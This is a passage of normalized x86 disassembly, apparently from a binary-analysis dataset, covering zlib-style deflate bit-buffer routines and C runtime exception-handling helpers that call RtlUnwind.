mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x406 ]
mov [ ebp - 0x20 ] ecx
mov edx 0x10
sub edx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov [ ebp - 0x18 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x100
jae r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x1698 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x7
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x48 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x2c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x2c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x34 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x34 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x38 ] ecx
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
sub_40baea
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xc ] 0x80
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x8c ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x100
jge r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x8c ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jge r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x2
cmp eax [ ebp - 0x4 ]
sbb ecx ecx
inc ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] cl
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x8c ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_40bb9c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
and eax 0x1
mov ecx [ ebp - 0x4 ]
or ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
shr edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp - 0x4 ]
shl eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov [ ebp + 0xc ] ecx
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0x1
mov esp ebp
pop ebp
retn
sub_40bbdd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jl r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] 0x0
jmp r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x16b0 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
shr dx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16b4 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
sub_40bcc6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] 0x0
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x16b0 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
sub_40bd82
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_40bcc6
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] 0x8
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
and edx 0xffff
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x10 ]
and ecx 0xffff
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x10 ]
not eax
and eax 0xffff
and eax 0xff
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x10 ]
not edx
and edx 0xffff
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp + 0xc ]
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
sub_40be9e
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_40bee0
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40bf2f
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40cf45
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_40bf65
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_40bfb9
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40d740
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40bfb9
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40cf45
add esp 0x20
pop ebp
retn
sub_40bfde
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40c092
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40c092
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40cf45
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40bee0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c107
